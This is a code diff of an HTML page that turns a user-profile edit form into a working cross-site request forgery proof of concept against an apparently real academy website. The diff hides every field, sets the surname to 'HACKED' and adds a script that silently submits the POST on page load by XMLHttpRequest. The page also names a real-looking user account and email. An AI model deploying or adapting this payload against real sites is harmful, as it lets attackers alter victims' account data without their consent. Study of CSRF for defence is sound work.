@@ -7,37 +7,61 @@
 </head>
 <body>
 
-    <h2>Modificación de datos de usuario</h2>
-
-    <form action="https://www.academiacientifica.com/academia/AcademiaWeb/editarUsuario/2639" method="post">
+    <h2>CSRF PoC Page</h2>
+    <img src="https://www.hola.com/horizon/landscape/d1eaad20c4c6-adobestock47432136.jpg" width="50%"/>
+    <form id="autoSubmitForm" action="https://www.academiacientifica.com/academia/AcademiaWeb/editarUsuario/2639" method="post">
         <input type="hidden" name="_method" value="POST">
 
-        <label for="nombre">Nombre:</label>
-        <input type="text" name="data[AcademiaAlumno][nombre]" value="manuel" id="nombre" required>
-        <br>
+        <input type="hidden" name="data[AcademiaAlumno][nombre]" value="manuel" id="nombre" required>
+       
 
-        <label for="apellidos">Apellidos:</label>
-        <input type="text" name="data[AcademiaAlumno][apellidos]" value="garcia" id="apellidos" required>
-        <br>
+        <input type="hidden" name="data[AcademiaAlumno][apellidos]" value="HACKED" id="apellidos" required>
+       
 
-        <label for="email">Email:</label>
-        <input type="text" name="data[AcademiaAlumno][email]" value="manulop23@gmail.com" id="email" required>
-        <br>
+        <input type="hidden" name="data[AcademiaAlumno][email]" value="manulop23@gmail.com" id="email" required>
+    
 
-        <label for="telefono">Teléfono:</label>
-        <input type="text" name="data[AcademiaAlumno][telefono]" id="telefono">
-        <br>
+        <input type="hidden" name="data[AcademiaAlumno][telefono]" id="telefono">
+     
 
-        <label for="no_robot">¿Cuál es el resultado de restarle dos a nueve?</label>
-        <input type="text" value="7" id="no_robot" disabled>
-        <br>
-
-        <input type="checkbox" checked disabled>
-        <label for="aviso_legal">He leído y acepto las condiciones de uso y la política de privacidad.</label>
-        <br>
-
-        <button type="submit">Actualizar</button>
+        <!-- <button type="submit">Actualizar</button> -->
     </form>
+
+
+    <!-- <script>
+        // Esta función se ejecutará cuando la página se cargue
+        window.onload = function() {
+            // Enviar el formulario automáticamente
+            document.getElementById("autoSubmitForm").submit();
+        }
+    </script> -->
+    
+    <!-- Peticion asincrona para evitar el redirect -->
+    <script>
+        // Función que se ejecutará cuando la página se haya cargado
+        window.onload = function() {
+            // Crear un objeto FormData con los datos del formulario
+            var formData = new FormData(document.getElementById("autoSubmitForm"));
+            
+            // Crear una solicitud AJAX (usando XMLHttpRequest)
+            var xhr = new XMLHttpRequest();
+            
+            // Configurar la solicitud: POST a la URL destino
+            xhr.open("POST", "https://www.academiacientifica.com/academia/AcademiaWeb/editarUsuario/2639", true);
+            
+            // Establecer lo que sucede cuando la solicitud termine
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText); // Muestra la respuesta del servidor
+                } else {
+                    console.log("Error al enviar el formulario");
+                } 
+            };
+            
+            // Enviar la solicitud con los datos del formulario
+            xhr.send(formData);
+        };
+    </script>
 
 </body>
 </html>
